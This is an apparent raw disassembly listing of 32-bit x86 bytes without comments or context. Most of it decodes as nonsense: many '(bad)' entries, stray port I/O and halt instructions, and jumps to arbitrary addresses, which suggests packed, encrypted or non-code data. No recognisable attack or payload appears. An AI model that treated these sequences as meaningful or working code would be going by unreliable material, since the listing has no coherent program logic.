  419e33:	mov    eax,0x6d
	...
  419e94:	add    BYTE PTR [eax],al
  419e96:	xchg   eax,ebx
  419e98:	pop    ss
  419e99:	lds    ebx,FWORD PTR [edi-0x31]
  419e9c:	xlat   BYTE PTR ds:[ebx]
  419e9d:	fimul  DWORD PTR [eax+0x5950c5a0]
  419ea3:	push   ecx
  419ea4:	mov    ebp,0x110ad66
  419ea9:	add    BYTE PTR [edi],al
  419eab:	add    DWORD PTR [eax],eax
  419ead:	add    BYTE PTR [edi+0x255823a8],bh
  419eb3:	jl     0x419e6a
  419eb5:	push   ebx
  419eb6:	mov    bh,BYTE PTR [ebp+0xee96d3b]
  419ebc:	mov    WORD PTR [esi-0x5890df5e],ss
  419ec2:	pop    edi
  419ec3:	aad    0x65
  419ec5:	lds    eax,FWORD PTR [edi-0x63]
  419ec8:	mov    ah,0x2d
  419eca:	jmp    0xa66430f4
  419ecf:	imul   esp,DWORD PTR [bx],0xaa7229d3
  419ed6:	push   ebp
  419ed7:	dec    eax
  419ed8:	push   eax
  419ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419eda:	div    DWORD PTR [esi+0x4d1f10f2]
  419ee0:	add    eax,0xbf2408f0
  419ee5:	push   edx
  419ee6:	ret    0x7189
  419ee9:	pavgw  mm3,QWORD PTR [esi+esi*4]
  419eed:	shr    DWORD PTR [esi+ebx*4],cl
  419ef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ef1:	pop    es
  419ef2:	stos   BYTE PTR es:[edi],al
  419ef3:	and    DWORD PTR [ecx-0x1b],ebp
  419ef6:	stc    
  419ef7:	mov    esp,ebp
  419ef9:	push   ecx
  419efa:	retf   0x7e22
  419efd:	pop    edx
  419efe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419eff:	fwait
  419f00:	lods   al,BYTE PTR ds:[esi]
  419f01:	jae    0x419f7e
  419f03:	sahf   
  419f04:	das    
  419f05:	mov    edi,0xf1d9f7b4
  419f0a:	mov    eax,ds:0x33336bb
  419f0f:	inc    ebx
  419f10:	lahf   
  419f11:	and    al,0xc7
  419f13:	mov    al,0x78
  419f15:	cmc    
  419f16:	in     eax,0x1d
  419f18:	xor    ch,BYTE PTR [ecx]
  419f1a:	push   DWORD PTR [esi+0x3cd69fe8]
  419f20:	jmp    0x419f54
  419f22:	or     al,0x9
  419f24:	xor    ah,0xe7
  419f27:	sub    BYTE PTR [ecx],al
  419f29:	(bad)  
  419f2a:	(bad)  
  419f2b:	inc    edi
  419f2c:	test   esi,ebx
  419f2e:	and    eax,0x8b174609
  419f33:	sbb    DWORD PTR ds:0x385ee05f,ebp
  419f39:	cmp    bl,BYTE PTR [ecx+0xe69b909]
  419f3f:	mov    eax,ds:0x176bc531
  419f44:	cmc    
  419f45:	(bad)  
  419f46:	sbb    ch,dl
  419f48:	xchg   ebp,eax
  419f49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f4a:	cmp    ax,0x7f12
  419f4e:	or     ch,BYTE PTR [eax-0x6d624a10]
  419f54:	mov    ch,0xfb
  419f56:	xchg   esi,eax
  419f57:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  419f59:	jmp    0x7e404b5a
  419f5e:	mov    dh,ah
  419f60:	push   ds
  419f61:	clc    
  419f62:	js     0x419fdf
  419f64:	mov    ch,0x9f
  419f66:	jns    0x419f76
  419f68:	inc    esi
  419f69:	inc    esi
  419f6a:	push   es
  419f6b:	leave  
  419f6c:	sub    al,0x82
  419f6e:	pop    edx
  419f6f:	dec    ebp
  419f70:	rol    BYTE PTR [edx+0x30],cl
  419f73:	adc    edi,DWORD PTR [edi+0x69b070ba]
  419f79:	int3   
  419f7a:	aas    
  419f7b:	clc    
  419f7c:	imul   edi,DWORD PTR [eax],0x3a
  419f7f:	sqrtps xmm3,XMMWORD PTR [eax-0x3114fb08]
  419f86:	or     BYTE PTR [edi+0x401a8c85],ch
  419f8c:	mov    ecx,gs
  419f8e:	cmp    cl,BYTE PTR [ebp+0x31]
  419f91:	jo     0x419f2b
  419f93:	push   edi
  419f94:	arpl   WORD PTR [ecx],di
  419f96:	sbb    al,0x17
  419f98:	pop    edi
  419f99:	daa    
  419f9a:	scas   eax,DWORD PTR es:[edi]
  419f9b:	add    BYTE PTR [edx+0x3a852e39],dh
  419fa1:	aad    0x5c
  419fa3:	pop    edx
  419fa4:	aad    0x2c
  419fa6:	cmp    cl,ah
  419fa8:	rol    ah,1
  419faa:	inc    eax
  419fab:	nop
  419fac:	ins    BYTE PTR es:[edi],dx
  419fad:	cwde   
  419fae:	pop    ebx
  419faf:	out    dx,eax
  419fb0:	mov    DWORD PTR [edx],0xcfb902
	...
  41a016:	dec    esi
  41a017:	jmp    0x41a043
  41a019:	dec    esi
  41a01a:	scas   eax,DWORD PTR es:[edi]
  41a01b:	iret   
  41a01c:	outs   dx,BYTE PTR ds:[esi]
  41a01d:	jmp    0x41a015
  41a01f:	in     al,dx
  41a020:	pop    ds
  41a021:	outs   dx,DWORD PTR ds:[esi]
  41a022:	fadd   st(2),st
  41a024:	xchg   edi,eax
  41a025:	mov    eax,0x111b4
  41a02a:	pop    es
  41a02b:	add    DWORD PTR [eax],eax
  41a02d:	add    ah,bl
  41a02f:	push   ebx
  41a030:	(bad)  
  41a031:	hlt    
  41a032:	inc    eax
  41a033:	adc    eax,0xb268e1d
  41a038:	push   cs
  41a039:	and    al,ah
  41a03b:	in     al,dx
  41a03c:	mov    ecx,0xaf8cee27
  41a041:	xchg   edx,eax
  41a042:	lods   eax,DWORD PTR ds:[esi]
  41a043:	mov    al,ds:0x2fbfad79
  41a048:	out    0x17,eax
  41a04a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a04b:	sub    dh,BYTE PTR [esi+eax*4]
  41a04e:	dec    esi
  41a04f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a050:	arpl   sp,si
  41a052:	lea    ebp,[bx+0x6d]
  41a056:	hlt    
  41a057:	pop    ecx
  41a058:	pop    esp
  41a059:	mov    ah,0xd7
  41a05b:	lods   al,BYTE PTR ds:[esi]
  41a05d:	int    0x84
  41a05f:	or     DWORD PTR [eax+0x52],edi
  41a062:	sbb    BYTE PTR [edx],ch
  41a064:	(bad)  
  41a065:	sub    esp,DWORD PTR [edi+0x1b100d16]
  41a06b:	mov    ch,0xd6
  41a06d:	push   ss
  41a06e:	sub    eax,0xde43d0ef
  41a073:	adc    eax,0x5d153c
  41a078:	cs dec esi
  41a07a:	jp     0x41a0ed
  41a07c:	rcr    bh,1
  41a07e:	cli    
  41a07f:	add    eax,0x11e6edcf
  41a084:	fiadd  WORD PTR [ebx+0x2c7ee33]
  41a08a:	ret    
  41a08b:	int3   
  41a08c:	xchg   ecx,eax
  41a08d:	xor    eax,0x967f7413
  41a092:	mov    eax,ds:0x990ac738
  41a097:	out    0xfe,al
  41a099:	dec    ecx
  41a09a:	(bad)  
  41a09b:	cmp    cl,BYTE PTR [ebx]
  41a09d:	sbb    DWORD PTR [edx+edi*8-0x4445aabf],esp
  41a0a4:	adc    edi,eax
  41a0a6:	mov    al,0x59
  41a0a8:	adc    al,BYTE PTR [ebp-0x59511f1e]
  41a0ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0af:	test   ch,cl
  41a0b1:	out    dx,eax
  41a0b2:	push   eax
  41a0b3:	retf   
  41a0b4:	retf   
  41a0b5:	popf   
  41a0b6:	mov    dh,0xa
  41a0b8:	popa   
  41a0b9:	(bad)  
  41a0ba:	aaa    
  41a0bb:	jp     0x41a0b2
  41a0bd:	imul   ebp,DWORD PTR [edx],0xffffffc3
  41a0c0:	fs dec ebp
  41a0c2:	adc    eax,0x268cd9c2
  41a0c7:	cmp    eax,0xe805cd2
  41a0cc:	out    dx,eax
  41a0cd:	push   esi
  41a0ce:	inc    ebx
  41a0cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0d0:	xor    BYTE PTR [ebx],0xec
  41a0d3:	clc    
  41a0d4:	jmp    0x5a9b:0x9f8c6a08
  41a0db:	ja     0x41a067
  41a0dd:	daa    
  41a0de:	push   0x29
  41a0e0:	jb     0x41a127
  41a0e2:	add    eax,0x8489df6f
  41a0e7:	and    BYTE PTR [ebx-0x5c0993ed],bl
  41a0ed:	sbb    DWORD PTR [ecx-0x4dc211bf],ecx
  41a0f3:	repz rol BYTE PTR [ebx+0x10],1
  41a0f7:	cdq    
  41a0f8:	adc    BYTE PTR [ebx+ecx*2],ch
  41a0fb:	mov    WORD PTR [ebp+0x36],gs
  41a0fe:	fyl2xp1 
  41a100:	out    dx,al
  41a101:	dec    ebp
  41a102:	jge    0x41a0c7
  41a104:	data16 lock adc bl,dh
  41a108:	and    ch,bl
  41a10a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a10b:	xlat   BYTE PTR ds:[ebx]
  41a10c:	sub    DWORD PTR [edi-0x4d],ebp
  41a10f:	cmc    
  41a110:	rol    BYTE PTR [ebx+0x334801d1],1
  41a116:	fisub  WORD PTR [eax]
  41a118:	pop    esi
  41a119:	sbb    BYTE PTR ds:0xee6ab13b,al
  41a11f:	repz mov eax,ds:0x620fb4f8
  41a125:	or     DWORD PTR [ebx-0xac3e5e2],0x3e314742
  41a12f:	and    dl,BYTE PTR [edx-0x76]
  41a132:	cmc    
  41a133:	aam    0x76
	...
  41a195:	add    BYTE PTR [esp+ecx*1],bl
  41a198:	std    
  41a199:	sbb    ebp,edi
  41a19b:	stc    
  41a19c:	cld    
  41a19d:	or     eax,0xe0cd0383
  41a1a2:	data16 je 0x41a1a9
  41a1a5:	mov    ebp,0x112bb
  41a1aa:	pop    es
  41a1ab:	add    DWORD PTR [eax],eax
  41a1ad:	add    BYTE PTR [ecx+0x25f074ff],ch
  41a1b3:	ficom  DWORD PTR [edi]
  41a1b5:	xchg   ecx,eax
  41a1b6:	mov    esi,0xa3eb0a24
  41a1bb:	cdq    
  41a1bc:	bound  ebx,QWORD PTR [ebx]
  41a1be:	rcl    al,0x80
  41a1c1:	jecxz  0x41a22f
  41a1c3:	cmp    ebx,0xa285b154
  41a1c9:	out    dx,eax
  41a1ca:	jb     0x41a187
  41a1cc:	ins    DWORD PTR es:[edi],dx
  41a1cd:	xchg   BYTE PTR [ebp-0x4a1159d8],cl
  41a1d3:	fdiv   QWORD PTR [ebp+0x5a]
  41a1d6:	sbb    eax,DWORD PTR [eax]
  41a1d8:	push   esp
  41a1d9:	(bad)  
  41a1da:	nop
  41a1db:	mov    bh,0x2c
  41a1dd:	cmp    DWORD PTR [eax],ebx
  41a1df:	mov    al,0x4
  41a1e1:	jb     0x41a1bb
  41a1e3:	jno    0x41a169
  41a1e5:	cdq    
  41a1e6:	outs   dx,BYTE PTR ds:[esi]
  41a1e7:	mov    DWORD PTR [edx+0x79],esp
  41a1ea:	xlat   BYTE PTR ds:[ebx]
  41a1eb:	jge    0x41a207
  41a1ed:	aam    0xe
  41a1ef:	out    dx,al
  41a1f0:	leave  
  41a1f1:	jecxz  0x41a230
  41a1f3:	jns    0x41a1db
  41a1f5:	jnp    0x41a26a
  41a1f7:	shl    DWORD PTR [edi-0x6fb756a4],0x3c
  41a1fe:	test   BYTE PTR [esi+0x2e4ec592],dl
  41a204:	fild   DWORD PTR [eax]
  41a206:	cmp    bl,BYTE PTR [eax]
  41a208:	repz std 
  41a20a:	adc    ch,BYTE PTR [edi]
  41a20c:	push   eax
  41a20d:	pop    ebx
  41a20e:	addr16 xor edx,edi
  41a211:	jl     0x41a213
  41a213:	sbb    al,0x3d
  41a215:	push   cs
  41a216:	mov    WORD PTR ds:0xaba721bb,es
  41a21c:	push   edi
  41a21d:	ror    BYTE PTR [edx],1
  41a21f:	cli    
  41a220:	sub    eax,0x8c581b88
  41a225:	fadd   DWORD PTR [edi+edx*8+0x63]
  41a229:	adc    cl,BYTE PTR [edx]
  41a22b:	and    al,0x5a
  41a22d:	mov    bh,0xbb
  41a22f:	rol    DWORD PTR [ecx-0x23461529],cl
  41a235:	mov    eax,ds:0xd96a7afd
  41a23a:	rcr    DWORD PTR [esi-0x62],cl
  41a23d:	or     eax,0x4f2d1100
  41a242:	jg     0x41a295
  41a244:	xchg   ebx,eax
  41a245:	iret   
  41a246:	retf   
  41a247:	sar    edx,1
  41a249:	out    0xf1,al
  41a24b:	mov    bh,0x5d
  41a24d:	fnstenv [edx]
  41a24f:	adc    ah,BYTE PTR [eax-0x29]
  41a252:	fistp  WORD PTR [edi-0x4d4bbcf1]
  41a258:	cli    
  41a259:	mov    BYTE PTR [edx+0x58],dh
  41a25c:	stc    
  41a25d:	jp     0x41a2db
  41a25f:	cmp    al,0xde
  41a261:	adc    al,0x9
  41a263:	div    BYTE PTR [ebx]
  41a265:	es xchg ebp,eax
  41a267:	je     0x41a1ed
  41a269:	stos   BYTE PTR es:[edi],al
  41a26a:	lods   al,BYTE PTR ds:[esi]
  41a26b:	lock daa 
  41a26d:	jecxz  0x41a213
  41a26f:	xor    eax,0xdf6dd8b3
  41a274:	jae    0x41a29f
  41a276:	add    eax,0x607d275c
  41a27b:	(bad)  
  41a27c:	pop    esp
  41a27d:	test   al,0x64
  41a280:	ret    
  41a281:	test   eax,0x21ab8ee9
  41a286:	rol    DWORD PTR [ecx],cl
  41a288:	adc    edx,edi
  41a28a:	cmp    cl,BYTE PTR [ecx+0x40]
  41a28d:	add    dh,BYTE PTR [ecx+0x55a3264]
  41a293:	out    0xd7,eax
  41a295:	cmp    ebx,0x5418b4b8
  41a29b:	les    edi,FWORD PTR [eax-0x38]
  41a29e:	into   
  41a29f:	fwait
  41a2a0:	sbb    eax,esi
  41a2a2:	dec    eax
  41a2a3:	mov    ds:0xd94b498a,al
  41a2a8:	cmc    
  41a2a9:	arpl   WORD PTR [eax+0x5e],dx
  41a2ac:	xchg   esi,eax
  41a2ad:	es int 0x7
  41a2b0:	add    BYTE PTR [ecx+0x222b33],0x0
	...
  41a313:	add    BYTE PTR [eax],al
  41a315:	add    bh,dh
  41a317:	pop    eax
  41a318:	test   al,0x13
  41a31a:	scas   eax,DWORD PTR es:[edi]
  41a31b:	repz (bad) 
  41a31d:	cld    
  41a31e:	arpl   ax,bx
  41a320:	shl    DWORD PTR [eax-0x6dcdabba],0xc2
  41a327:	adc    eax,DWORD PTR [ecx]
  41a329:	add    BYTE PTR [edi],al
  41a32b:	add    DWORD PTR [eax],eax
  41a32d:	add    BYTE PTR [edi-0x7a],cl
  41a330:	aas    
  41a331:	jae    0x41a3a5
  41a333:	adc    ebx,ebp
  41a335:	addr16 dec ecx
  41a337:	sub    edx,DWORD PTR [ebx+0x42a0cd2b]
  41a33d:	and    al,0xce
  41a33f:	loopne 0x41a331
  41a341:	jb     0x41a319
  41a343:	sbb    BYTE PTR [eax+0x72eed7e3],bl
  41a349:	jb     0x41a2de
  41a34b:	loopne 0x41a2da
  41a34d:	test   DWORD PTR [eax+0x7a1f9eef],ebx
  41a353:	punpckhbw mm6,QWORD PTR [esi-0x4a]
  41a357:	cwde   
  41a358:	jecxz  0x41a335
  41a35a:	test   eax,0x2aee19a8
  41a35f:	daa    
  41a360:	ror    DWORD PTR ds:0x1cbfcf8b,0xd4
  41a367:	lock (bad) [ebp-0x7d3eca4a]
  41a36e:	sahf   
  41a36f:	pop    ebp
  41a370:	sub    al,0xe1
  41a372:	lock cmp BYTE PTR [edi-0x67],dh
  41a376:	hlt    
  41a377:	mov    eax,ds:0x36786b2f
  41a37c:	dec    esp
  41a37d:	mov    bh,0xbf
  41a37f:	ins    DWORD PTR es:[edi],dx
  41a380:	jne    0x41a3f6
  41a382:	mov    dl,0x98
  41a384:	ds test al,0x3f
  41a387:	sub    DWORD PTR [esp+eax*1+0x7d],0x5d603d54
  41a38f:	lea    eax,[edx+edi*8+0x14]
  41a393:	out    dx,al
  41a394:	jbe    0x41a321
  41a396:	or     BYTE PTR [edi+0x5bd43f41],bh
  41a39c:	cdq    
  41a39d:	fdivr  DWORD PTR [edx]
  41a39f:	popa   
  41a3a0:	xchg   edi,eax
  41a3a1:	adc    BYTE PTR [eax],ah
  41a3a3:	pop    ss
  41a3a4:	cwde   
  41a3a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3a6:	mov    cs,WORD PTR [eax]
  41a3a8:	clc    
  41a3a9:	mov    eax,0x11325cd7
  41a3ae:	push   ecx
  41a3af:	aas    
  41a3b0:	ret    0x2d31
  41a3b3:	or     eax,0x4b64a1f0
  41a3b8:	loope  0x41a3ad
  41a3ba:	popa   
  41a3bb:	ja     0x41a373
  41a3bd:	lods   eax,DWORD PTR ds:[esi]
  41a3be:	xlat   BYTE PTR ds:[ebx]
  41a3bf:	jmp    0x41a428
  41a3c1:	scas   eax,DWORD PTR es:[edi]
  41a3c2:	xlat   BYTE PTR ds:[ebx]
  41a3c3:	icebp  
  41a3c4:	sbb    eax,DWORD PTR [ebp-0x39]
  41a3c7:	lods   al,BYTE PTR ds:[esi]
  41a3c8:	cmc    
  41a3c9:	push   ebx
  41a3ca:	(bad)  
  41a3cb:	test   al,0x1d
  41a3cd:	(bad)  [edx-0x197ba16e]
  41a3d3:	pop    esi
  41a3d4:	mov    bl,0x47
  41a3d6:	dec    di
  41a3d8:	mov    bl,0x71
  41a3da:	and    DWORD PTR [ecx-0x3a],0x23
  41a3de:	mov    ds:0x3207e1a8,eax
  41a3e3:	ror    BYTE PTR [edi-0x56a31e35],cl
  41a3e9:	dec    eax
  41a3ea:	test   al,0x58
  41a3ec:	add    eax,0xb94ea2c3
  41a3f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3f2:	inc    ecx
  41a3f3:	call   0xe3b56083
  41a3f8:	mov    ebp,0x7527dd1a
  41a3fd:	in     eax,0x1
  41a3ff:	jae    0x41a3e3
  41a401:	and    al,0x1a
  41a403:	fild   WORD PTR [esi+ebx*8-0x43634f7e]
  41a40a:	cmp    eax,0x417f5118
  41a40f:	inc    eax
  41a410:	data16 mov ch,0xc3
  41a413:	sbb    al,BYTE PTR [ecx-0x6d334b7f]
  41a419:	inc    edi
  41a41a:	or     DWORD PTR [eax+0x61dcfb45],ebp
  41a420:	xor    eax,0x4eb28262
  41a425:	data16 hlt 
  41a427:	aaa    
  41a428:	cmp    al,0x6c
  41a42a:	sahf   
  41a42b:	test   eax,0x5526a115
  41a430:	sti    
  41a431:	mov    cl,0x31
  41a433:	fs hlt 
	...
  41a495:	add    BYTE PTR [edi-0xf0307e],bh
  41a49b:	dec    edi
  41a49c:	push   DWORD PTR [edx+0x6df04d13]
  41a4a2:	xor    al,0x35
  41a4a4:	shr    BYTE PTR [edx+0x114c9],0x7
  41a4ab:	add    DWORD PTR [eax],eax
  41a4ad:	add    BYTE PTR [edi+ebx*8+0x44],dl
  41a4b1:	add    eax,0x9ef86952
  41a4b6:	push   es
  41a4b7:	and    esp,DWORD PTR [esi+0x1f9da3e6]
  41a4bd:	pop    esp
  41a4be:	arpl   WORD PTR [ebp+ebp*1+0x44],ax
  41a4c2:	sahf   
  41a4c3:	jo     0x41a4d7
  41a4c5:	popa   
  41a4c6:	dec    esp
  41a4c7:	(bad)  
  41a4c8:	add    DWORD PTR [edi-0x7873836e],0xfffffffd
  41a4cf:	loopne 0x41a48a
  41a4d1:	jne    0x41a47e
  41a4d3:	adc    ah,BYTE PTR [eax-0x52]
  41a4d6:	push   es
  41a4d7:	adc    ebx,DWORD PTR [ecx-0x5b]
  41a4da:	xchg   edi,eax
  41a4db:	mov    bl,0x58
  41a4dd:	in     al,dx
  41a4de:	mov    esp,0x9bb648e6
  41a4e3:	ja     0x41a4fa
  41a4e5:	xchg   esp,eax
  41a4e6:	popa   
  41a4e7:	adc    ebx,DWORD PTR [eax]
  41a4e9:	pop    ebp
  41a4ea:	test   DWORD PTR [edx],0x8f8c703f
  41a4f0:	sti    
  41a4f1:	test   DWORD PTR [edx],ecx
  41a4f3:	and    BYTE PTR [edi-0x43],dh
  41a4f6:	arpl   WORD PTR [eax-0x51],bx
  41a4f9:	js     0x41a557
  41a4fb:	repz jge 0x41a4e8
  41a4fe:	push   esp
  41a4ff:	mov    ch,0xb6
  41a501:	xchg   edi,eax
  41a502:	xor    ch,al
  41a504:	in     al,dx
  41a505:	xchg   ebx,eax
  41a506:	or     ah,dl
  41a508:	jae    0x41a4c8
  41a50a:	inc    edx
  41a50b:	lahf   
  41a50c:	mov    ecx,0xe2a71840
  41a511:	outs   dx,DWORD PTR ds:[esi]
  41a512:	scas   eax,DWORD PTR es:[edi]
  41a513:	jo     0x41a4c3
  41a515:	mov    esi,0x33211d4b
  41a51a:	pusha  
  41a51b:	mov    BYTE PTR [eax],dl
  41a51d:	xchg   edx,eax
  41a51e:	lea    ecx,cs:[eax]
  41a521:	(bad)  
  41a522:	sti    
  41a523:	div    DWORD PTR [ecx+0x2b4eed08]
  41a529:	aas    
  41a52a:	adc    BYTE PTR ds:0xd40e91c3,ch
  41a530:	add    ecx,DWORD PTR [esi+esi*4+0x18aad166]
  41a537:	dec    esi
  41a538:	repnz sbb esp,edi
  41a53b:	xchg   edx,eax
  41a53c:	mov    eax,ds:0x2f95d5a5
  41a541:	mov    ecx,0xae95a752
  41a546:	push   0x4963b0f
  41a54b:	sub    al,0xda
  41a54d:	mov    bh,0x4e
  41a54f:	outs   dx,BYTE PTR ds:[esi]
  41a550:	sbb    esi,DWORD PTR [ecx]
  41a552:	aas    
  41a553:	push   0x7d
  41a555:	fdivr  QWORD PTR [edx+0x3a]
  41a558:	add    DWORD PTR [ebx-0x5c39c74d],ebx
  41a55e:	scas   al,BYTE PTR es:[edi]
  41a55f:	fld    TBYTE PTR [edx]
  41a561:	dec    edi
  41a562:	out    0x9a,al
  41a564:	stc    
  41a565:	mov    al,0x99
  41a567:	push   DWORD PTR [edx-0x57]
  41a56a:	inc    ecx
  41a56b:	les    edi,FWORD PTR [edx+0x4a45b0e7]
  41a571:	test   BYTE PTR [ecx+0x1b],0x19
  41a575:	ins    DWORD PTR es:[edi],dx
  41a576:	jnp    0x41a50f
  41a578:	adc    ah,BYTE PTR [edi+0x4ab32c4e]
  41a57e:	cmc    
  41a57f:	push   esi
  41a580:	adc    BYTE PTR [ebp-0x3418d279],dh
  41a586:	ret    0x6cce
  41a589:	or     eax,0x365686f8
  41a58e:	mov    DWORD PTR [esi],ebx
  41a590:	sbb    al,BYTE PTR [ebp-0x5f]
  41a593:	add    eax,0x5aa89ad2
  41a598:	les    esp,FWORD PTR [esi]
  41a59a:	push   0xefbcf24d
  41a59f:	pop    ecx
  41a5a0:	adc    ch,bh
  41a5a2:	ds iret 
  41a5a4:	cwde   
  41a5a5:	xchg   ebx,eax
  41a5a6:	call   0x6509:0x93c83687
  41a5ad:	mov    edx,0x8ab83753
  41a5b2:	lods   al,BYTE PTR ds:[esi]
  41a5b3:	outs   dx,DWORD PTR ds:[esi]
  41a5b4:	ja     0x41a5b6
	...
  41a616:	pop    esp
  41a617:	sub    al,BYTE PTR [ecx]
  41a619:	inc    ecx
  41a61a:	ja     0x41a687
  41a61c:	pop    esp
  41a61d:	aas    
  41a61e:	pop    ecx
  41a61f:	jmp    0x41a5e9
  41a621:	mov    edx,0xe99313ce
  41a626:	rcl    BYTE PTR ds:0x1070001,1
  41a62c:	add    BYTE PTR [eax],al
  41a62e:	or     BYTE PTR [ebp-0x53],cl
  41a631:	mov    WORD PTR [ebp+0x69],?
  41a634:	loope  0x41a68c
  41a636:	rol    BYTE PTR [eax-0x416e8118],1
  41a63c:	mov    BYTE PTR [edi],bh
  41a63e:	lock (bad) 
  41a641:	xor    ah,al
  41a643:	dec    ebx
  41a644:	out    0xb3,al
  41a646:	sub    eax,DWORD PTR [edx*2+0x79817f9b]
  41a64d:	data16 rcl BYTE PTR [ecx],1
  41a650:	inc    esi
  41a651:	push   ss
  41a652:	inc    ecx
  41a653:	pop    ds
  41a654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a655:	cmp    DWORD PTR [edx-0x4f],esp
  41a658:	lahf   
  41a659:	mov    BYTE PTR [edi+0x4d],ch
  41a65c:	push   eax
  41a65d:	ja     0x41a6a7
  41a65f:	arpl   WORD PTR [ebx],dx
  41a661:	stos   BYTE PTR es:[edi],al
  41a662:	dec    ecx
  41a663:	(bad)  
  41a664:	lock pop edx
  41a666:	push   ss
  41a667:	ins    BYTE PTR es:[edi],dx
  41a668:	fsub   st(1),st
  41a66a:	loopne 0x41a6a2
  41a66c:	rcr    DWORD PTR [eax-0x5d],cl
  41a66f:	ret    
  41a670:	fadd   st,st(4)
  41a672:	inc    ebx
  41a673:	xchg   ebx,edx
  41a675:	jb     0x41a621
  41a677:	push   DWORD PTR [esi+edx*4-0x7c37f8e7]
  41a67e:	xchg   esp,eax
  41a67f:	mov    ah,0x68
  41a681:	dec    ecx
  41a682:	in     eax,dx
  41a683:	arpl   WORD PTR [ecx+0x6d],dx
  41a686:	push   ss
  41a687:	and    DWORD PTR [edx-0x6c],edx
  41a68a:	pushf  
  41a68b:	mov    ecx,DWORD PTR [edx-0x68]
  41a68e:	xlat   BYTE PTR ds:[ebx]
  41a68f:	add    DWORD PTR [esi-0x47],ebp
  41a692:	jmp    0x2ff0f88f
  41a697:	loope  0x41a666
  41a699:	mov    cl,0x3
  41a69b:	(bad)  
  41a69c:	mov    bh,0x1b
  41a69e:	frstor [ebp+0x30]
  41a6a1:	mov    ah,0x6
  41a6a3:	cmp    DWORD PTR [edi+0x62],eax
  41a6a6:	mov    ds:0x19492e62,al
  41a6ab:	xchg   edi,eax
  41a6ac:	lock pop ebp
  41a6ae:	cli    
  41a6af:	xor    DWORD PTR [edx-0x60201824],ebp
  41a6b5:	imul   ebp,DWORD PTR [edi+0x0],0x51
  41a6b9:	and    ecx,DWORD PTR [ebx+0x7e8fe819]
  41a6bf:	retf   
  41a6c0:	imul   esi,DWORD PTR [edx+0xda8ef1],0x437b87f2
  41a6ca:	ja     0x41a687
  41a6cc:	push   ecx
  41a6cd:	sbb    ch,al
  41a6cf:	ss ins DWORD PTR es:[edi],dx
  41a6d1:	call   0xf4dd06e9
  41a6d6:	jmp    0x3c51e40c
  41a6db:	lds    ebx,FWORD PTR [eax+0x46]
  41a6de:	icebp  
  41a6df:	out    dx,eax
  41a6e0:	sbb    bh,BYTE PTR [eax-0x25]
  41a6e3:	jbe    0x41a6fa
  41a6e5:	into   
  41a6e6:	icebp  
  41a6e7:	lock add ch,BYTE PTR ds:0x4eff2496
  41a6ee:	cwde   
  41a6ef:	mov    esi,0x5394b4e1
  41a6f4:	mov    bl,0xe7
  41a6f6:	xchg   esi,eax
  41a6f7:	and    eax,esi
  41a6f9:	test   BYTE PTR [eax+0x58173ef7],ch
  41a6ff:	stos   BYTE PTR es:[edi],al
  41a700:	xchg   esp,eax
  41a701:	mov    ecx,0xf080001b
  41a706:	push   edx
  41a707:	jecxz  0x41a721
  41a709:	test   DWORD PTR [eax],eax
  41a70b:	or     eax,0xb49f2f3
  41a710:	mov    dh,0x3c
  41a712:	xchg   esp,eax
  41a713:	push   esi
  41a714:	or     BYTE PTR [esi-0x37],bl
  41a717:	inc    esp
  41a718:	mov    ebx,0x8deaa1c2
  41a71d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a71e:	cwde   
  41a71f:	mov    ebx,cs
  41a721:	stc    
  41a722:	mov    ebx,0x840cc18b
  41a727:	xor    esi,0x2ae00709
  41a72d:	cmp    al,0x82
  41a72f:	or     BYTE PTR [ecx-0x1597f01],0x0
	...
  41a796:	repz xchg edi,eax
  41a798:	jae    0x41a721
  41a79a:	ja     0x41a783
  41a79c:	div    edi
  41a79e:	fisttp QWORD PTR [ebx+0x5f50a8]
  41a7a4:	xchg   ebp,eax
  41a7a5:	scas   eax,DWORD PTR es:[edi]
  41a7a6:	xlat   BYTE PTR ds:[ebx]
  41a7a7:	push   ss
  41a7a8:	add    DWORD PTR [eax],eax
  41a7aa:	pop    es
  41a7ab:	add    DWORD PTR [eax],eax
  41a7ad:	add    BYTE PTR [ebp+0x39],ah
  41a7b0:	int3   
  41a7b1:	xor    edi,DWORD PTR [ecx+0x274d4d3a]
  41a7b7:	mov    ch,0x7d
  41a7b9:	nop
  41a7ba:	mov    ds:0xf4d89f18,al
  41a7bf:	lds    edi,FWORD PTR [ebx]
  41a7c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7c2:	ret    
  41a7c3:	push   edi
  41a7c4:	add    dl,bh
  41a7c6:	int3   
  41a7c7:	xchg   ebp,eax
  41a7c8:	inc    esi
  41a7c9:	jns    0x41a7a6
  41a7cb:	mov    al,0xb2
  41a7cd:	outs   dx,DWORD PTR ds:[esi]
  41a7ce:	enter  0xb6f3,0x3f
  41a7d2:	cmp    esp,DWORD PTR [esi+0xe]
  41a7d5:	in     eax,dx
  41a7d6:	and    edi,eax
  41a7d8:	test   eax,0xbb01f02f
  41a7dd:	push   edx
  41a7de:	xchg   ebx,eax
  41a7df:	jo     0x41a774
  41a7e1:	add    dh,BYTE PTR [edx+0x259a7bc0]
  41a7e7:	dec    ebp
  41a7e8:	sub    DWORD PTR [eax],ebx
  41a7ea:	in     al,0xe2
  41a7ec:	pop    esp
  41a7ed:	stc    
  41a7ee:	adc    eax,0x6a8c7fbc
  41a7f3:	dec    esp
  41a7f4:	xor    al,0x5b
  41a7f6:	test   al,0x78
  41a7f8:	push   ebp
  41a7f9:	loop   0x41a80b
  41a7fb:	jecxz  0x41a81a
  41a7fd:	fdivr  st(5),st
  41a7ff:	sbb    ah,ah
  41a801:	ins    DWORD PTR es:[edi],dx
  41a802:	pop    ecx
  41a803:	jl     0x41a872
